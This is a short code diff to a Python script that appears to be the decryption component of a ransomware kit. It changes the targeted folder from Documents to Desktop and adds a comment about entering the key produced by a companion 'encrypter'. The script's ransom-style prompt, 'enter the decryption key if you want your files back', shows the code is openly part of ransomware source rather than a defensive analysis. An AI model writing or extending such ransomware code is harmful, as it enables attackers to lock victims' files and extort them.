@@ -36,14 +36,14 @@ key_char_pool_len=len(key_char_pool)
 
 # Grab file paths to encrypt
 print("Preparing files...........")
-desktop_path = os.environ['USERPROFILE'] + '\\Documents'
+desktop_path = os.environ['USERPROFILE'] + '\\Desktop'
 files = os.listdir(desktop_path)
 abs_files=[]
 for f in files:
     if os.path.isfile(f'{desktop_path}\\{f}') and f !=__file__[:-2]+'exe':
         abs_files.append(f'{desktop_path}\\{f}')
 print("Successfully located all files!!!  :)")
-key=input("Please enter the decryption key if you want your files back:")
+key=input("Please enter the decryption key if you want your files back:") #Enter the key genreated when you run encrypter
 
 # Setup queue with  jobs for threads to decrypt
 
